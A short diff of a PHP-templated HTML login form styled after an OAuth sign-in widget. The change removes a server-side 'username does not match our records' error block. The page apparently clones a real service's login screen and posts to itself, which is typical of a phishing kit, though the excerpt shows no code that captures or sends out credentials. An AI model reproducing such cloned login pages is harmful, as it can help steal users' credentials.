@@ -18,9 +18,7 @@
     <body ng-app="UxpLoginApp" class="uxp-theme ng-scope">
         <div class="widget-c1-oauth-login position-relative oauth-login">
             <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">
-                <div class="errors errors-login error-state error-div" <?=!$error ? 'style="display: none"' : 'style="display: block"'?>>
-                    <span ng-hide="state.isSubmittingForm || state.isFieldOnChange" class="error-message">The username you entered does not match our records. Please try again.</span>
-                </div>
+                
                 <form id="loginForm" id="input-form" name="" class="center-block c1-login-form ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength" action="" method="post" autocomplete="off">
                     <input type="hidden" id="userAgent" name="userAgent">
                     <div>
